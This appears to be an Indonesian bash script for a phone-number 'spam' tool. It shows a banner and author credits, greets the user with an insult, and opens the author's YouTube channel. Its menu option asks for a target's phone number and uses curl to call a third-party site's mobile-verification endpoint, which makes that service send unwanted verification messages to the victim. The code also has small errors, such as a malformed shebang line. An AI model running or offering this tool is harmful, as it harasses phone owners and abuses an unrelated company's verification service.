#/!bin/bash
##ANSI colors (FG & BG)
RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')"  ORANGE="$(printf '\033[33m') "BLUE="$(printf '\033[34m')" CYANI="$(printf '\033[36m')"  MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[1;33m')" WHITE="$(printf '\033[37m')"
clear
echo "${CYANI}Subscribe Dlu Channel Gua Cuk!"
xdg-open "https://youtube.com/channel/UCpiiUOZeivl7yqPU9u0f0tw"
sleep 1
clear
echo "	                   ${MAGENTA}   ▄██▄            ▄▄"
echo "                     ${MAGENTA}        █████▄▄▄▄      ▄▀"
echo "  ${CYAN}▐█▀█  ▄█▀▄  ██    ██ ${MAGENTA}       ▀██▀▀████▄   ▄▀"
echo "  ${CYAN}▐█   ▐█▄▄▐█ ██    ██  ${MAGENTA}     ▄█▀▄██▄████▄ ▄█"
echo "  ${CYAN}▐█▄█ ▐█  ▐█ ██▄▄█ ██▄▄█${MAGENTA} ▄▄█▀▄▄█ ▀████▀██▀"
sleep 1
echo "${CYANI}[${CYAN}•${CYANI}]____________________________________________[${CYAN}•${CYANI}]"
echo "${CYANI} |                                             ${CYANI} |"
echo "${CYANI} |        ${CYAN} [${CYANI}+${CYAN}] AUTHOR ${CYANI}:${CYAN}  Tam-PolX	       ${CYANI} |"
echo "${CYANI} |        ${CYAN} [${CYANI}+${CYAN}] YT     ${CYANI}:${CYAN}  Durjana Elite	       ${CYANI} |"
echo "${CYANI} |        ${CYAN} [${CYANI}+${CYAN}] FB     ${CYANI}:${CYAN}  Ompong Belo	       ${CYANI} |"
echo "${CYANI} |        ${CYAN} [${CYANI}+${CYAN}] IG     ${CYANI}:${CYAN}  @yslbstm	        ${CYANI}|"
echo "${CYANI}[${CYAN}•${CYANI}]____________________________________________[${CYAN}•${CYANI}]"
sleep 1
echo""
echo        "${RED} SELAMAT DATANG BANGSAT"
echo""
echo "${CYANI}---------------------------------------"
echo "${CYANI}      {${GREEN}1${CYANI}} ${MAGENTA}Spam "
echo "${CYANI}      {${GREEN}0${CYANI}} ${MAGENTA}exit "
echo "${CYANI}---------------------------------------"
echo""
read -p "${GREEN} Pilih No  ${CYAN} =>${GREEN}  " dont
if [ $dont = 1 ]
then
echo "${RED}———————————————————————————————————————"
echo "  ${RED} !Nomor Diawali Dengan (88xx)!"
echo "———————————————————————————————————————"
sleep 1
echo ""
read -p " ${CYAN} Masukan Nomor Target ${MAGENTA}=>${WHITE} " nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
   echo " Jangn Lupa Makan. Pura-Pura Bahagia Juga Butuh Tenaga "
fi


